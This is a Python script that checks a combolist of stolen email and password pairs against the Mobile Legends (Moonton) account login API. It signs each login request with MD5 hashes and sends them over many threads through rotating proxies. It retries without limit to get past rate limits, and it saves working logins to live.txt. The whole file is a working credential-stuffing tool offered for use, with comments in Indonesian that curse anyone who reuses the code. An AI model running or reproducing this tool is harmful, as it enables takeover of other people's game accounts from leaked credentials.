#code_by_danu
#jangan_di_recode_ajg
#semoga_yang_recode_hidupnya_sesat
 
import time
import os, sys, hashlib, json, random, re
from mmq_prox import proxy
os.system('clear')

print('''\033[93m
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█  \033[92m╦ ╦╔╗╦ ╔╗╔╗╔╦╗╔╗\033[93m  █ \033[0mUSERNAME >> \033[92mDANU NIH BOSS\033[93m
█  \033[92m║║║╠ ║ ║ ║║║║║╠ \033[93m  █ \033[0mVERSI >> \033[92mV1.1\033[93m
█  \033[92m╚╩╝╚╝╚╝╚╝╚╝╩ ╩╚╝\033[93m  █ \033[0mKANG UNCHEK\033[93m
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\n''')

try:
  from concurrent.futures import ThreadPoolExecutor
except ImportError:
  os.system(
    'pip install futures'
  )
  exit(
    'Please restart this tools'
  )

try:
  from bs4 import BeautifulSoup as bs
except ImportError:
  os.system(
    'pip install bs4'
  )
  exit(
    'Please restart this tools'
  )
  
try:
  import requests
except ImportError:
  os.system(
    'pip install requests'
  )
  exit(
    'Please restart this tools'
  )

api = 'https://accountmtapi.mobilelegends.com/'

class MOONTON:
  def __init__(self, url):
    self.userdata = []
    self.live = []
    self.wrong_password = []
    self.wrong_email = []
    self.limit_login = []
    self.unknown = []
    self.proxy_list = []
    self.api = url
    self.loop = 0
    
  def auto_upper(self, string):
    text = ''.join(
      re.findall(
        '[a-z-A-Z]',
        string
      )
    )
    if text.islower(
      ) == True:
      o = ''
      for i in range(
        len(
          string
        )
      ):
        if string[i].isnumeric(
          ) == False and string[
            i
          ].isalpha(
          ):
          return o + string[
            i
          ].upper(
          ) + string[
            i+1:
          ]
        else: o+=string[
          i
        ]
      return string 
    else: return string

  def main(self):
   
    empas = input(
      '\033[91m COMBOLIST >> \033[0m'
    )
    if os.path.exists(
      empas
    ):
      for data in open(
        empas,
        'r',
        encoding='utf-8'
      ).readlines():
        try:
          user = data.strip(
          ).split(
            '|'
          )
          if user[
           0
          ] and user[
            1
          ]:
            em = user[
              0
            ]
            pw = self.auto_upper(
              user[
                1
              ]
            )
            self.userdata.append({
              'email': em,
              'pw': pw,
              'userdata': '|'.join(
                [
                  em,
                  pw
                ]
              )
            })
        except IndexError:
          try:
            user = data.strip().split(
              ':'
            )
            if user[
              0
            ] and user[
              1
            ]:
              em = user[
                0
              ]
              pw = self.auto_upper(
                user[
                  1
                ]
              )
              self.userdata.append({
                'email': em,
                'pw': pw,
                'userdata': ':'.join(
                  [
                    em,
                    pw
                  ]
                )
             })
          except: pass
      if len(
        self.userdata
      ) == 0:
        exit(
          '\033[91m Masukin Nama Empas Yang Bener'
        )
      print(
        '\033[0m Total {0} account'.format(
          str(
            len(
              self.userdata
            )
          )
        )
      )
      ask = input(
        '\033[94m MAU PAKE PROXY?\033[0m >> '
      )
      if ask.lower(
      ).strip(
      ) == 'y':
        self.valid_proxy = proxy.prox(
        )
        with ThreadPoolExecutor(
          max_workers=50
        ) as thread:
          [
            thread.submit(
              self.validate,
              user,
              True
            ) for user in self.userdata
          ]
      else:
        print(
          ''
        )
        with ThreadPoolExecutor(
          max_workers=10
        ) as thread:
          [
            thread.submit(
              self.validate,
              user,
              False
            ) for user in self.userdata
          ]
      print('\n\n\033[0m {\033[96mHASIL\033[0m}')
      print(
        '\n\033[0m[\033[92mLIVE/MASUK\033[0m] >> \033[0m'+str(
          len(
            self.live
          )
        )+''
      )
      print(
        '\033[0m[\033[93mOLAH PASWORD\033[0m] >> \033[0m'+str(
          len(
            self.wrong_password
          )
        )+''
      )
      print(
        '\033[0m[\033[91mTIDAK ADA AKUN\033[0m] >> \033[0m'+str(
          len(
            self.wrong_email
          )
        )+''
      )
      print(
        '\033[0m[\033[95mLIMIT\033[0m] >> \033[95m'+str(
          len(
            self.limit_login
          )
        )+''
      )
      print(
        '\033[0m[\033[94mAPI EROR\033[0m] >> \033[0m'+str(
          len(
            self.unknown
          )
        )+'\n'
      )
      print('\033[0mMAAF MASIH BANYAK KEKURANGAN\n')
      exit(
      )
    else: print(
      '[!] File Not Found "{0}"'.format(
        empas
      )
    )

  def hash_md5(self, string):
    md5 = hashlib.new(
      'md5'
    )
    md5.update(
      string.encode(
        'utf-8'
      )
    )
    return md5.hexdigest(
    )

  def build_params(self, user):
    md5pwd = self.hash_md5(
      user[
        'pw'
      ]
    )
    hashed = self.hash_md5(
      'account={0}&md5pwd={1}&op=login'.format(
        user[
          'email'
        ],
        md5pwd
      )
    )
    return json.dumps({
      'op': 'login',
      'sign': hashed,
      'params': {
        'account': user[
          'email'
        ],
        'md5pwd': md5pwd,
      },
      'lang': 'cn'
    })
  
  def validate(self, user, with_porxy):
    try:
      data = self.build_params(
        user
      )
      headers = {
        'host': 'accountmtapi.mobilelegends.com',
        'user-agent': 'Mozilla/5.0',
        'x-requested-with': 'com.mobile.legends' 
      }
      if with_porxy == True:
        proxy = random.choice(
          self.valid_proxy
        )
        response = requests.post(
          self.api,
          data=data,
          headers=headers,
          proxies=proxy,
          timeout=10
        )
      else:
        response = requests.post(
          self.api,
          data=data,
          headers=headers
        )
      if response.status_code == 200:
        if response.json(
        )[
          'message'
         ] == 'Error_Success':
          print(
            '\r\033[92m[\033[0mMASUK\033[92m]\033[92m => \033[90m'+user[
              'userdata'
             ]+'  \033[0m|\033[7;92mSuccessLogin\033[0m|'
          )
          self.live.append(
            user[
              'userdata'
            ]
          )
          open(
            'live.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
         ] == 'Error_PasswdError':
          print(
            '\r\033[93m[\033[0mWRONG\033[93m]\033[93m => \033[90m'+user[
              'userdata'
            ]+'  \033[0m|\033[7;93mWrongPassword\033[0m|'
          )
          self.wrong_password.append(
            user[
              'userdata'
            ]
          )
          open(
            'wrong.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
         ] == 'Error_FailedTooMuch':
          print(
            '\r\033[94m[\033[0mUNKWN\033[94m]\033[94m => \033[90m'+user[
              'userdata'
            ]+'  \033[0m|\033[7;94mEmaiLTidakValid\033[0m|'
          )
          self.unknown.append(
            user[
              'userdata'
            ]
          )
          open(
            'unknown.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
         ] == 'Error_PwdErrorTooMany':
          print(
            '\r\033[95m[\033[0mLIMIT\033[95m]\033[95m => \033[90m'+user[
              'userdata'
            ]+'  \033[0m|\033[7;95mLimitLogin\033[0m|'
          )
          self.limit_login.append(
            user[
              'userdata'
            ]
          )
          open(
            'Limit.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
        ] == 'Error_NoAccount':
          print(
            '\r\033[91m[\033[0mMATII\033[91m]\033[91m => \033[90m'+user[
              'userdata'
            ]+'  \033[0m|\033[7;91mTidakAdaAkun\033[0m|'
          )
          self.wrong_email.append(
            user[
              'userdata'
            ]
          )
          open(
            'wrong-email.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        die = len(
          self.wrong_email
        ) 
        self.loop+=1
        print(
          end='\r\033[0m[\033[0m%s\033[0m]\033[94mTO\033[0m[\033[0m%s\033[0m][\033[94m%s\033[0m]\033[92mLIVE\033[0m[%s]\033[93mWRONG\033[0m[%s]\033[95mLIMIT\033[0m[%s\033[0m]\033[91mDIE\033[0m[%s]\033[0m '%(
            str(
             self.loop
            ),
            str(
              len(
                self.userdata
              )
            ),
            str(
              len(
                self.unknown
               )
            ),
            str(
              len(
                self.live
              )
            ),
            str(
              len(
                self.wrong_password
             )
           ),
           str(
             len(
               self.limit_login
              )
            ),
            str(
              die
            )
          ),                 
           flush=True
        )
    
      else: self.validate(
        user,
        with_porxy
      )
    except: self.validate(
      user,
      with_porxy
    )

if __name__ == '__main__':
  try:
    (
      MOONTON(
        api
      ).main(
      )
    )
  except Exception as E:
    exit(
      '[!] Error: %s' %(
        E
      )
    )
